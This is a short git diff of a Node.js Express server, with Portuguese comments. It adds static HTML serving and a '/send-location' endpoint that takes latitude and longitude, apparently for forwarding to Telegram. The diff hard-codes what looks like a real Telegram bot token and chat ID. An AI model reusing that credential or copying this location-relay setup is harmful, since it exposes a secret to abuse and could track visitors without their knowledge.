@@ -3,13 +3,20 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
+const path = require("path");
+
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-const TELEGRAM_BOT_TOKEN = "BOT-TOKEN"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "CHAT-TOKEN"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+// Servir arquivos HTML da pasta 'public'
+app.use(express.static(path.join(__dirname, "public")));
+
+
+
+const TELEGRAM_BOT_TOKEN = "8188117748:AAG7nilyNiIf4VTP30udvIX0mneZh3ThaLY"; // Substitua pelo token do seu bot
+const TELEGRAM_CHAT_ID = "6943635765"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
 
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps } = req.body;
